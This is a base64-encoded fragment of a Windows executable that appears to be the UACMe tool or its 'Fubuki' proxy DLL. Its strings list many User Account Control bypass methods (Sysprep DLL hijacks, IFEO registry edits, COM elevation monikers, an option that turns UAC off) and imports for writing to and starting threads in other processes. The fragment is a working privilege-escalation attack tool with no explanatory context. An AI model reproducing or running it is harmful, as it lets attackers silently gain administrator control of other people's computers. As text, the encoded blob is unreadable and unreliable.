cgBHZW5lcmF0ZUFjdGlvblF1ZXVlAFBvd2VyR2V0QWN0aXZlU2NoZW1lAFByaXZhdGVDb0ludGVybmV0Q29tYmluZVVyaQBQcm9jZXNzQWN0aW9uUXVldWUAU0xHZXRXaW5kb3dzSW5mb3JtYXRpb24AV2RzQWJvcnRCbGFja2JvYXJkAFdkc0Fib3J0QmxhY2tib2FyZEl0ZW1FbnVtAFdkc0NyZWF0ZUJsYWNrYm9hcmQAV2RzRGVzdHJveUJsYWNrYm9hcmQAV2RzRW51bUZpcnN0QmxhY2tib2FyZEl0ZW0AV2RzRW51bU5leHRCbGFja2JvYXJkSXRlbQBXZHNGcmVlRGF0YQBXZHNHZXRCbGFja2JvYXJkVmFsdWUAV2RzSW5pdGlhbGl6ZQBXZHNJc0RpYWdub3N0aWNNb2RlRW5hYmxlZABXZHNTZXRBc3NlcnRGbGFncwBXZHNTZXR1cExvZ01lc3NhZ2VXAFdkc1Rlcm1pbmF0ZQC4JgAAAAAAAAAAAACkJwAAKCAAAJAmAAAAAAAAAAAAAPQnAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADWJwAAAAAAAMYnAAAAAAAAsicAAAAAAADmJwAAAAAAAAAAAAAAAAAAZicAAAAAAAByJwAAAAAAAFgnAAAAAAAAkicAAAAAAABCJwAAAAAAACYnAAAAAAAAGicAAAAAAACAJwAAAAAAAAgnAAAAAAAAAAAAAAAAAADFAkdldFN0YXJ0dXBJbmZvVwA8A0hlYXBGcmVlAABbAUV4cGFuZEVudmlyb25tZW50U3RyaW5nc1cA/QNPdXRwdXREZWJ1Z1N0cmluZ1cAAH8AQ2xvc2VIYW5kbGUAOANIZWFwQWxsb2MAVwFFeGl0UHJvY2VzcwCpAkdldFByb2Nlc3NIZWFwAADbAENyZWF0ZVByb2Nlc3NXAABLRVJORUwzMi5kbGwAAJICUmVnUXVlcnlWYWx1ZUV4VwAAhQJSZWdPcGVuS2V5RXhXAGgCUmVnRGVsZXRlS2V5VwBUAlJlZ0Nsb3NlS2V5AEFEVkFQSTMyLmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBAAAKcRAACUIgAAqBEAADQTAACoIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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IAB0AG8AIABhAGwAdABlAHIAIABrAGUAeQAgAHMAZQBjAHUAcgBpAHQAeQAAAAAAAAAAAAAAAABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABJAG0AYQBnAGUAIABGAGkAbABlACAARQB4AGUAYwB1AHQAaQBvAG4AIABPAHAAdABpAG8AbgBzAAAAAAAAAFsAVQBDAE0AXQAgAEYAYQBpAGwAZQBkACAAdABvACAAbwBwAGUAbgAgAEkARgBFAE8AIABrAGUAeQAAAAAAAAAAAAAAAAAAAFsAVQBDAE0AXQAgAEYAYQBpAGwAZQBkACAAdABvACAAYwByAGUAYQB0AGUAIABJAEYARQBPACAAcwB1AGIAawBlAHkAAAAAAEcAbABvAGIAYQBsAEYAbABhAGcAAAAAAFsAVQBDAE0AXQAgAEYAYQBpAGwAZQBkACAAdABvACAAcwBlAHQAIABzAHUAYgBrAGUAeQAgAHYAYQBsAHUAZQAgADEAAAAAAEgAaQBiAGkAawBpAC4AZABsAGwAAAAAAFYAZQByAGkAZgBpAGUAcgBEAGwAbABzAAAAAAAAAAAAWwBVAEMATQBdACAARgBhAGkAbABlAGQAIAB0AG8AIABzAGUAdAAgAHMAdQBiAGsAZQB5ACAAdgBhAGwAdQBlACAAMgAAAAAAJQB0AGUAbQBwACUAXABIAGkAYgBpAGsAaQAuAGQAbABsAAAAAAAAAFsAVQBDAE0AXQAgAFcAdQBzAGEAIABmAGEAaQBsAGUAZAAgAGMAbwBwAHkAIABIAGkAYgBpAGsAaQAAAAAAAAAlAHMAeQBzAHQAZQBtAHIAbwBvAHQAJQBcAHMAeQBzAHQAZQBtADMAMgBcAHcAaQBuAHMAYQB0AC4AZQB4AGUAAAAAAAAAAAAlAHQAZQBtAHAAJQBcAHcAaQBuAHMAYQB0AC4AZQB4AGUAAAAAAAAAJQB0AGUAbQBwACUAXAAAAFsAVQBDAE0AXQAgAEQAbABsACAAZAByAG8AcABwAGUAZAAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5AAAAAAB3AGkAbgBzAGEAdAAuAGUAeABlAAAAAAAAAAAAAAAAAC8AYwAgAHcAdQBzAGEAIAAlAHcAcwAgAC8AZQB4AHQAcgBhAGMAdAA6ACUAJQB3AGkAbgBkAGkAcgAlACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAAAAAAAAAAAAAAAAAAAAAAAlAHMAeQBzAHQAZQBtAHIAbwBvAHQAJQBcAHMAeQBzAHQAZQBtADMAMgBcAHMAeQBzAHAAcgBlAHAAXAB3AGkAbgBzAGEAdAAuAGUAeABlAAAAAAAAAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAFwAAAAAACUAcwB5AHMAdABlAG0AcgBvAG8AdAAlAFwAcwB5AHMAdABlAG0AMwAyAFwAAAAAAGUAdgBlAG4AdAB2AHcAcgAuAG0AcwBjAAAAAAAAAAAAbQBtAGMALgBlAHgAZQAAAGUAeABwAGwAbwByAGUAcgAuAGUAeABlAAAAAAAAAAAAAAAAAAAAAABbAFUAQwBNAF0AIABDAGEAbgBuAG8AdAAgAG8AcABlAG4AIAB0AGEAcgBnAGUAdAAgAHAAcgBvAGMAZQBzAHMALgAAAAAAAAAAAAAAAAAAAFsAVQBDAE0AXQAgAEMAYQBuAG4AbwB0ACAAYQBsAGwAbwBjAGEAdABlACAAbQBlAG0AbwByAHkAIABpAG4AIAB0AGEAcgBnAGUAdAAgAHAAcgBvAGMAZQBzAHMALgAAAFsAVQBDAE0AXQAgAEMAYQBuAG4AbwB0ACAAdwByAGkAdABlACAAdABvACAAdABoAGUAIAB0AGEAcgBnAGUAdAAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQAuAAAAAAAAAAAAVQBBAEMATQBlAAAAAAAAAFQAaABpAHMAIABXAGkAbgBkAG8AdwBzACAAaQBzACAAdQBuAHMAdQBwAHAAbwByAHQAZQBkAC4AAAAAAAAAAAAAAAAAAAAAAEEAZABtAGkAbgAgAGEAYwBjAG8AdQBuAHQAIAB3AGkAdABoACAAbABpAG0AaQB0AGUAZAAgAHQAbwBrAGUAbgAgAHIAZQBxAHUAaQByAGUAZAAuAAAAAABbAFUAQwBNAF0AIABTAHkAcwBwAHIAZQBwACAAYwByAHkAcAB0AGIAYQBzAGUACgANAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAHAAcgBlACAAVwBpAG4AZABvAHcAcwAgADgALgAxACAAdQBzAGUAAABbAFUAQwBNAF0AIABTAHkAcwBwAHIAZQBwACAAcwBoAGMAbwByAGUACgANAAAAAAAAAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAIAA4AC4AMQAgAHUAcwBlAAAAWwBVAEMATQBdACAAUwB5AHMAcAByAGUAcAAgAGQAYgBnAGMAbwByAGUACgANAAAAVABoAGkAcwAgAG0AZQB0AGgAbwBkACAAaQBzACAAbwBuAGwAeQAgAGYAbwByACAAVwBpAG4AZABvAHcAcwAgADEAMAAgAHUAcwBlAAAAAABbAFUAQwBNAF0AIABPAG8AYgBlAAoADQAAAAAAAAAAAFsAVQBDAE0AXQAgAEEAcABwAEMAbwBtAHAAYQB0ACAAUgBlAGQAaQByAGUAYwB0AEUAWABFAAoADQAAAAAAAABUAGgAaQBzACAAbQBlAHQAaABvAGQAIABvAG4AbAB5ACAAdwBvAHIAawBzACAAZgByAG8AbQAgAHgAOAA2AC0AMwAyACAAVwBpAG4AZABvAHcAcwAgAG8AcgAgAFcAbwB3ADYANAAAAAAAAAAAAAAAVABoAGkAcwAgAG0AZQB0AGgAbwBkACAAZABvAGUAcwAgAG4AbwB0ACAAdwBvAHIAawAgAGkAbgAgAFcAaQBuAGQAbwB3AHMAIAAxADAAIABiAHUAaQBsAGQAcwAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAMQAwADEAMwA2AAAAAAAAAFsAVQBDAE0AXQAgAFMAaQBtAGQAYQAKAA0AAAAAAAAAWwBVAEMATQBdACAAQwBhAHIAYgBlAHIAcAAKAA0AAABbAFUAQwBNAF0AIABDAGEAcgBiAGUAcgBwAF8AZQB4AAoADQAAAAAAWwBVAEMATQBdACAAVABpAGwAbwBuAAoADQAAAAAAAABbAFUAQwBNAF0AIABBAFYAcgBmAAoADQAAAAAAAAAAAFsAVQBDAE0AXQAgAFcAaQBuAFMAQQBUAAoADQAAAAAAWwBVAEMATQBdACAAQQBwAHAAQwBvAG0AcABhAHQAIABTAGgAaQBtACAAUABhAHQAYwBoAAoADQAAAAAAAAAAAFsAVQBDAE0AXQAgAE0ATQBDACAACgANAAAAAAAAAAAAQQBwAHAAYQByAGUAbgB0AGwAeQAgAGkAdAAgAHMAZQBlAG0AcwAgAHkAbwB1ACAAYQByAGUAIAByAHUAbgBuAGkAbgBnACAAdQBuAGQAZQByACAAVwBPAFcANgA0AC4ACgANAFQAaABpAHMAIABpAHMAIABuAG8AdAAgAHMAdQBwAHAAbwByAHQAZQBkACwAIAByAHUAbgAgAHgANgA0ACAAdgBlAHIAcwBpAG8AbgAgAG8AZgAgAHQAaABpAHMAIAB0AG8AbwBsAC4AAAAAAFsAVQBDAE0AXQAgAFMAdABhAG4AZABhAHIAZAAgAEEAdQB0AG8ARQBsAGUAdgBhAHQAaQBvAG4AIABtAGUAdABoAG8AZAAgAGMAYQBsAGwAZQBkAAoADQAAAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAHcAaQBsAGwAIABUAFUAUgBOACAAVQBBAEMAIABPAEYARgAsACAAYQByAGUAIAB5AG8AdQAgAHMAdQByAGUAPwAgAFkAbwB1ACAAdwBpAGwAbAAgAG4AZQBlAGQAIAB0AG8AIAByAGUAZQBuAGEAYgBsAGUAIABpAHQAIABhAGYAdABlAHIAIABtAGEAbgB1AGEAbABsAHkALgAAAAAAAAAAAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAIAA3AC8AOAAvADgALgAxAAAAWwBVAEMATQBdACAAQwBhAHIAYgBlAHIAcAAgAG0AZQB0AGgAbwBkACAAYwBhAGwAbABlAGQACgANAAAAAAAAAFsAVQBDAE0AXQAgAEEAVgByAGYAIABtAGUAdABoAG8AZAAgAGMAYQBsAGwAZQBkAAoADQAAAAAAAAAAAAAAAABVAHMAZQAgADMAMgAgAGIAaQB0ACAAdgBlAHIAcwBpAG8AbgAgAG8AZgAgAHQAaABpAHMAIAB0AG8AbwBsACAAbwBuACAAMwAyACAAYgBpAHQAIABPAFMA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QQBiAUZpbGVUaW1lVG9Mb2NhbEZpbGVUaW1lAN0FV2lkZUNoYXJUb011bHRpQnl0ZQDnAkdldFRlbXBGaWxlTmFtZUEAAGEBRmlsZVRpbWVUb0Rvc0RhdGVUaW1lAMUCR2V0U3RhcnR1cEluZm9XABkFU2V0TGFzdEVycm9yAADCAENyZWF0ZUZpbGVXAPEDT3BlblByb2Nlc3MApgVWZXJTZXRDb25kaXRpb25NYXNrANsAQ3JlYXRlUHJvY2Vzc1cAAKoFVmVyaWZ5VmVyc2lvbkluZm9XAABLRVJORUwzMi5kbGwAAIMDd3NwcmludGZXADkBR2V0RGVza3RvcFdpbmRvdwAAUQJNZXNzYWdlQm94VwAJAUZpbmRXaW5kb3dXANcBR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkAABVU0VSMzIuZGxsAABgAlJlZ0NyZWF0ZUtleVcAhQJSZWdPcGVuS2V5RXhXAKICUmVnU2V0VmFsdWVFeFcAAFQCUmVnQ2xvc2VLZXkAXQJSZWdDcmVhdGVLZXlFeFcAQURWQVBJMzIuZGxsAAA2AVNoZWxsRXhlY3V0ZUV4VwBTSEVMTDMyLmRsbAAwAUlJREZyb21TdHJpbmcAEABDTFNJREZyb21TdHJpbmcAb2xlMzIuZGxsAN8DUnRsR2V0VmVyc2lvbgCGAU50T3BlblByb2Nlc3NUb2tlbgAAsQFOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzALQBTnRRdWVyeUluZm9ybWF0aW9uVG9rZW4A6wBOdENsb3NlAHAEUnRsTnRTdGF0dXNUb0Rvc0Vycm9yAG50ZGxsLmRsbABDYWJpbmV0LmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA